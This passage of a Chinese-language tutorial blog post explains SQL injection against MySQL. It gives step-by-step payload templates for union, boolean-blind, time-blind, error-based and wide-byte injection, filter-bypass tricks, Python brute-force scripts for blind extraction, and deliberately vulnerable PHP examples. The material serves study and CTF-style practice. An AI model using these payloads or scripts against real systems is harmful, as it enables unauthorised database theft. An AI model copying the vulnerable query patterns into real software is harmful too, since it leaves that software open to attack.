<p>用户提交<code>index.php?id=1&#39;</code>时，单个的单引号没有闭合，产生了语法错误，不正常返回。</p>
<ol start="2">
<li>输入 <code>and 1=1</code>，正常返回</li>
</ol>
<p>用户提交<code>index.php?id=1 and 1=1</code>时，语句拼接后查询成功，正常返回。</p>
<ol start="3">
<li>输入 <code>and 1=2</code>，不正常返回</li>
</ol>
<p>用户提交<code>index.php?id=1 and 1=2</code>时，<code>1=2</code>为<code>false</code>，查询失败，不正常返回。</p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>字符型注入就是注入点的数据类型为字符型，<strong>有用</strong>单引号或者双引号括起来。</p>
<p>典型代码示例</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">...</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span></code></pre>

<p>判断方法</p>
<ol>
<li>输入单引号，不正常返回</li>
</ol>
<p>用户提交<code>index.php?id=1&#39;</code>时，拼接的SQL语句变成了<code>SELECT * FROM users WHERE id = &#39;1&#39;&#39; LIMIT 0,1</code>单引号没有闭合，产生了语法错误，不正常返回。</p>
<ol start="2">
<li>输入 <code>&#39;and &#39;1&#39;=&#39;1</code>，正常返回</li>
</ol>
<p>用户提交<code>&#39;and &#39;1&#39;=&#39;1</code>时，拼接的SQL语句变成了<code>SELECT * FROM users WHERE id = &#39;1&#39; and &#39;1&#39;=&#39;1&#39; LIMIT 0,1</code>，查询成功，正常返回。</p>
<ol start="3">
<li>输入 <code>&#39;and &#39;1&#39;=&#39;2</code>，不正常返回</li>
</ol>
<p>用户提交<code>&#39;and &#39;1&#39;=&#39;2</code>时，拼接的SQL语句变成了<code>SELECT * FROM users WHERE id = &#39;1&#39; and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code>，<code>&#39;1&#39;=&#39;2&#39;</code>为<code>false</code>，查询失败，不正常返回。</p>
<h1 id="MySQL注入"><a href="#MySQL注入" class="headerlink" title="MySQL注入"></a>MySQL注入</h1><p>MySQL数据库是一种开源的关系型数据库查询系统，是使用量最高的一种数据库管理系统，这里将以MySQL为例子讲解常见的几种注入方式。</p>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>利用MySQL中<code>UNION</code>关键词可以同时执行多条SQL语句的特点，在参数中插入恶意的SQL注入语句，执行额外的SQL语句，获取额外敏感信息或者执行其他数据库操作。</p>
<h3 id="payload模板与步骤"><a href="#payload模板与步骤" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
<li>判断注入点</li>
</ol>
<pre class="language-php" data-language="php"><code class="language-php">id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span></code></pre>

<ol start="2">
<li>判断列数</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 order by 1</code></pre>

<ol start="3">
<li>判断报错点</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select 1,2,3</code></pre>

<ol start="4">
<li>查当前库名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select database()</code></pre>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select CONCAT_WS(CHAR(32,58,32),user(),database(),version())</code></pre>

<ol start="5">
<li>查表名</li>
</ol>
<pre class="language-php" data-language="php"><code class="language-php">id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> union select <span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span></code></pre>

<ol start="6">
<li>查列名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1</code></pre>

<ol start="7">
<li>查字段</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and 1&#x3D;2 union select group_concat(列名，列名···) from 库名 limit 0,1</code></pre>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li>union用于合并多个select语句的结果，并默认去重</li>
</ol>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png" class="" title="image-20210724161433506" loading="lazy">

<ol start="2">
<li>联合查询中合并的选择查询必须具相同的输出字段数，采用相同的顺序，并包含相同或兼容的数据类型</li>
</ol>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724160925428.png" class="" title="image-20210724160925428" loading="lazy">

<h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p>与报错注入不同，bool盲注没有任何的报错信息输出，页面只有正常和不正常两种状态，攻击者只能通过返回的两个状态来判断输入的SQL语句是否正确，从而判断数据库中储存了哪些信息。</p>
<h3 id="payload模板与步骤-1"><a href="#payload模板与步骤-1" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
<li>获取数据库长度</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select length(database()))&gt;10</code></pre>

<ol start="2">
<li>查库名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select ascii(substr(database(),1,1)))&gt;63</code></pre>

<ol start="3">
<li>查表名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;63</code></pre>

<ol start="4">
<li>查列名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39;),1,1))&gt;63</code></pre>

<ol start="5">
<li>查字段</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and ascii(substr((select 列名 from 表名),1,1))&gt;63</code></pre>

<h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li>substr函数</li>
</ol>
<p>语法格式：SUBSTR(字段名,A,N)</p>
<p>从指定的字段从第A个字符（这里的字符从<strong>1</strong>开始）向后截取N个字符</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724183800027.png" class="" title="image-20210724183800027" loading="lazy">

<ol start="2">
<li>ascii函数</li>
</ol>
<p>语法格式：ASCII(字符)</p>
<p>返回字符的ASCII码</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184056134.png" class="" title="image-20210724184056134" loading="lazy">

<ol start="3">
<li>脚本</li>
</ol>
<p>盲注都是搭配脚本使用的，这里提供一个简单的python脚本模板，根据具体环境修改</p>
<ul>
<li>遍历查询</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php">import requests

url <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>      <span class="token comment">#需要盲注的网址</span>

payload <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>   <span class="token comment">#bool盲注的payload</span>

flagstr <span class="token operator">=</span> <span class="token string single-quoted-string">'0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm-&#125;&#123;'</span>  

flag <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>

<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> c in flagstr<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string double-quoted-string">"id"</span><span class="token punctuation">:</span>payload<span class="token operator">.</span><span class="token function">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>c<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string single-quoted-string">''</span> in r<span class="token operator">.</span>text<span class="token punctuation">:</span>    <span class="token comment">#返回的页面成功时的回显，由此判断是否存在此字符</span>
            flag<span class="token operator">+=</span>c
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> c<span class="token operator">==</span><span class="token string single-quoted-string">'&#125;'</span><span class="token punctuation">:</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<ul>
<li>二分查询</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php">import requests

url <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>

flag <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>

payload <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>

<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token class-name return-type">max</span><span class="token operator">=</span><span class="token number">128</span>
    min<span class="token operator">=</span><span class="token number">32</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        mid<span class="token operator">=</span><span class="token punctuation">(</span>max<span class="token operator">+</span>min<span class="token punctuation">)</span><span class="token comment">//2</span>
        <span class="token keyword">if</span> min<span class="token operator">==</span>mid<span class="token punctuation">:</span>
            flag<span class="token operator">+=</span><span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token operator">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">:</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> 
        <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string single-quoted-string">''</span> in r<span class="token operator">.</span>text<span class="token punctuation">:</span>    <span class="token comment">#返回的页面成功时的回显，由此判断是否存在此字符</span>
            min<span class="token operator">=</span>mid
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            max<span class="token operator">=</span>mid</code></pre>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注是另一种形式的盲注，与bool盲注不同，时间盲注没有任何的报错信息输出，页面不管对或错都是一种状态，攻击者无法通过页面返回状态来判断输入的SQL注入测试语句是否正确，只能通过构造的SQL测试语句，根据页面的返回时间判断数据库中储存了哪些信息。</p>
<h3 id="payload模板与步骤-2"><a href="#payload模板与步骤-2" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
<li>获取数据库长度</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if(length((select database())&#x3D;5),0,5))</code></pre>

<ol start="2">
<li>查库名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if((select ascii(substr(database(),1,1)))&gt;63,0,5))</code></pre>

<ol start="3">
<li>查表名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;63,0,5))</code></pre>

<ol start="4">
<li>查列名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if(ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39;),1,1))&gt;63,0,5))</code></pre>

<ol start="5">
<li>查字段</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and sleep(if(ascii(substr((select 列名 from 表名),1,1))&gt;63,0,5))</code></pre>

<h3 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li>sleep函数</li>
</ol>
<p>语法格式：SLEEP(时间)</p>
<p>使执行挂起一段时间，单位为秒</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184131894.png" class="" title="image-20210724184131894" loading="lazy">

<ol start="2">
<li>if函数</li>
</ol>
<p>语法格式：IF(expr1,expr2,expr3)</p>
<p>效果类似于编程语言中常见的三元运算符，如果expr1为真（不等于0且不等于null），返回expr2，否则返回expr3</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184513617.png" class="" title="image-20210724184513617" loading="lazy">

<ol start="3">
<li>脚本</li>
</ol>
<pre class="language-php" data-language="php"><code class="language-php">import requests

url <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>

flag <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>

payload <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>

<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token class-name return-type">min</span><span class="token operator">=</span><span class="token number">32</span>
    max<span class="token operator">=</span><span class="token number">128</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        mid<span class="token operator">=</span><span class="token punctuation">(</span>max<span class="token operator">+</span>min<span class="token punctuation">)</span><span class="token comment">//2</span>
        <span class="token keyword">if</span> min<span class="token operator">==</span>mid<span class="token punctuation">:</span>
            flag<span class="token operator">+=</span><span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">:</span>
                <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
            max<span class="token operator">=</span>mid
        except Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            min<span class="token operator">=</span>mid</code></pre>

<h2 id="报错注入-floor"><a href="#报错注入-floor" class="headerlink" title="报错注入-floor"></a>报错注入-floor</h2><p>floor注入是报错注入的一种方式，主要原因是rand函数与group by子句一起使用时，rand函数会计算多次，会导致报错产生的注入。</p>
<h3 id="payload模板与步骤-3"><a href="#payload模板与步骤-3" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
<li>查库名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221449012.png" class="" title="image-20210724221449012" loading="lazy">

<ol start="2">
<li>查表名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select 1 from (select count(*),concat((select (table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2)) x from information_schema.tables group by x)a)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221612834.png" class="" title="image-20210724221612834" loading="lazy">

<ol start="3">
<li>查列名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724224135261.png" class="" title="image-20210724224135261" loading="lazy">

<ol start="4">
<li>查字段</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and (select 1 from (select count(*),concat((select 列名 from 表名 limit 0,1),0x3a,floor(rand()*2))x from information_schema.tables group by x)a)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724230714048.png" class="" title="image-20210724230714048" loading="lazy">

<h3 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li>floor函数</li>
</ol>
<p>语法格式：FLOOR(x)</p>
<p>返回不大于x的最大整数值</p>
<ol start="2">
<li>rand函数</li>
</ol>
<p>语法格式：RAND()</p>
<p>产生一个在0和1之间的随机数</p>
<p>当提供一个种子数时，生成的随机数是相同的</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724232103948.png" class="" title="image-20210724232103948" loading="lazy">

<h2 id="报错注入-updatexml"><a href="#报错注入-updatexml" class="headerlink" title="报错注入-updatexml"></a>报错注入-updatexml</h2><p><code>updatexml</code>也是一种报错注入，它利用<code>updatexml</code>函数中第二个参数<code>XPATH_string</code>的报错进行注入。</p>
<p><code>XPATH_string</code>是XML文档路径，格式是&#x2F;XXX&#x2F;XXX&#x2F;XXX&#x2F;，如果格式不正确就会报错</p>
<h3 id="payload模板与步骤-4"><a href="#payload模板与步骤-4" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
<li>查库名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and updatexml(1,concat(0x7e,database()),0)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725110316413.png" class="" title="image-20210725110316413" loading="lazy">

<ol start="2">
<li>查表名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)),0)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111053307.png" class="" title="image-20210725111053307" loading="lazy">

<ol start="3">
<li>查列名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1)),0)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111329442.png" class="" title="image-20210725111329442" loading="lazy">

<ol start="4">
<li>查字段</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and updatexml(1,concat(0x7e,(select 列名 from 表名 limit 0,1)),0)</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111528458.png" class="" title="image-20210725111528458" loading="lazy">

<h3 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li>updataxml函数</li>
</ol>
<p>语法格式：UPDATEXML(XML_document, XPath_string, new_value)</p>
<p>其中：</p>
<p>XML_document是String型数据，是XML文档的文件格式</p>
<p>XPath_string是（Xpath格式的字符串）是XML文档路径</p>
<p>new_value是String型数据，用于替换查找到的符合条件的数据</p>
<p><code>updatexml</code>可以对XML文档进行更新</p>
<h2 id="报错注入-extractvalue"><a href="#报错注入-extractvalue" class="headerlink" title="报错注入-extractvalue"></a>报错注入-extractvalue</h2><p><code>extractvalue</code>也是一种报错注入，它与<code>updatexml</code>注入的原理一样</p>
<h3 id="payload模板与步骤-5"><a href="#payload模板与步骤-5" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
<li>查库名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and extractvalue(1,concat(0x7e,database()))</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725144530805.png" class="" title="image-20210725144530805" loading="lazy">

<ol start="2">
<li>查表名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)))</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145257615.png" class="" title="image-20210725145257615" loading="lazy">

<ol start="3">
<li>查列名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1)))</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145450328.png" class="" title="image-20210725145450328" loading="lazy">

<ol start="4">
<li>查字段</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1 and extractvalue(1,concat(0x7e,(select 列名 from 库名 limit 0,1)))</code></pre>

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725150025086.png" class="" title="image-20210725150025086" loading="lazy">

<h3 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li>extractvalue函数</li>
</ol>
<p>语法格式：EXTRACTVALUE(XML_document, XPath_string)</p>
<p><code>extrctvalue</code>函数可以对XML文档进行查询</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>开发者为了防止出现SQL注入攻击，将用户输入的数据用addslashes等函数进行过滤。</p>
<p>addslashes等函数默认对单引号等字符进行转义，这样就可以避免注入。</p>
<p>宽字节注入产生的原因是：MySQL在使用过GBK编码的时候，如果第一个字符的ASCII码大于128，会认为前两个字符是一个汉字，会将后面的转义字符<code>\</code>“吃掉”，将前两个字符拼接为汉字，这样就可以将SQL语句闭合，造成宽字节注入。</p>
<h3 id="payload模板与步骤-6"><a href="#payload模板与步骤-6" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
<li>查库名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,database(),3</code></pre>

<ol start="2">
<li>查表名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x74657374（库名的十六进制，这里单引号会转义）</code></pre>

<ol start="3">
<li>查列名</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;0x74657374 and table_name&#x3D;0x666c6167</code></pre>

<ol start="4">
<li>查字段</li>
</ol>
<pre class="language-none"><code class="language-none">id&#x3D;1%81&#39; and 1&#x3D;2 union select 1,group_concat(列名，列名，···),3 from 表名</code></pre>

<h3 id="注意事项-6"><a href="#注意事项-6" class="headerlink" title="注意事项"></a>注意事项</h3><p>利用宽字节注入原理，只要第一个字符的ASCII码大于<code>128</code>，MySQL数据库就会认为前两个字符是一个汉字，可以正常闭合SQL语句进行注入</p>
<p>这样就可以用ASCII码为129的字符进行注入，其URL编码为<code>%81</code></p>
<p>当然注入的第一个字符不一定是<code>%81</code>，只要是大于<code>%80</code>，且在汉字的编码内即可</p>
<h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>根据应用的过滤规则，会将空格加入黑名单，但是空格存在多种绕过方式，常见的包括<code>/**/</code>、<code>制表符</code>、<code>换行符</code>、<code>括号</code>、<code>反引号</code>来代替空格</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#漏洞代码示例</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ /'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id = <span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<ul>
<li>&#x2F;**&#x2F;</li>
</ul>
<p>MySQL数据库中可以用&#x2F;**&#x2F;（注释符）来代替空格，将空格用注释符代替后，SQL语句可以正常运行</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125323913.png" class="" title="image-20210726125323913" loading="lazy">

<ul>
<li>制表符</li>
</ul>
<p>在MySQL数据库中，可以用制表符（%09、%0B）来代替空格，制表符是不可见字符，在URL传输中需要编码</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125809221.png" class="" title="image-20210726125809221" loading="lazy">

<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125830823.png" class="" title="image-20210726125830823" loading="lazy">

<ul>
<li>换行符</li>
</ul>
<p>MySQL数据库支持换行执行SQL语句，可以利用换行符（%0A、%0C）代替空格，换行符也是不可见字符，在URL传输中需要编码</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125908271.png" class="" title="image-20210726125908271" loading="lazy">

<ul>
<li>括号</li>
</ul>
<p>在MySQL数据库中，任何查询中都可以使用括号嵌套SQL语句</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726130541927.png" class="" title="image-20210726130541927" loading="lazy">

<p>MySQL数据库中有一个特性。</p>
<p>在条件语句中，在<code>where id=1</code>后面加<code>=1</code>成为<code>where id=1=1</code>，就是对前面所有结果与1，查询结果与原来一样</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131604921.png" class="" title="image-20210726131604921" loading="lazy">

<p>在<code>where id=1</code>后面加<code>=0</code>成为<code>where id=1=0</code>，就是对前面的所有结果与0（取反），即查询的结果除去原有查询结果的其他数据</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131919320.png" class="" title="image-20210726131919320" loading="lazy">

<p>利用以上特性，构造括号绕过payload就可以进行bool盲注，获得数据库的信息</p>
<pre class="language-none"><code class="language-none">id&#x3D;1&#x3D;(ascii(mid(database()from(1)for(1)))&#x3D;116)</code></pre>

<p>当数据库的第一个字母为t时，上面等价于<code>id=1=1</code></p>
<ul>
<li>`</li>
</ul>
<p>MySQL中的反引号是为了区分MySQL的保留字与普通字而引入的符号，反引号可以代替空格</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726145309481.png" class="" title="image-20210726145309481" loading="lazy">

<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>MySQL会执行放在<code>/*! ···*/</code>中的语句。</p>
<p><code>/*! 50010···/</code>也可以执行位于其中的SQL语句，其中50010表示SQL版本为5.00.10。当MySQL数据库的实际版本号大于内联注释中的版本号时，就会执行内联注释中的代码。</p>
<p>当前MySQL数据库的版本是5.7.26，使用此版本的数据库进行验证</p>
<img src="/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726150609315.png" class="" title="image-20210726150609315" loading="lazy">

<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>根据应用程序的过滤规则，通常会针对恶意关键字设置黑名单，如果存在恶意关键字，应用程序就会退出运行。</p>
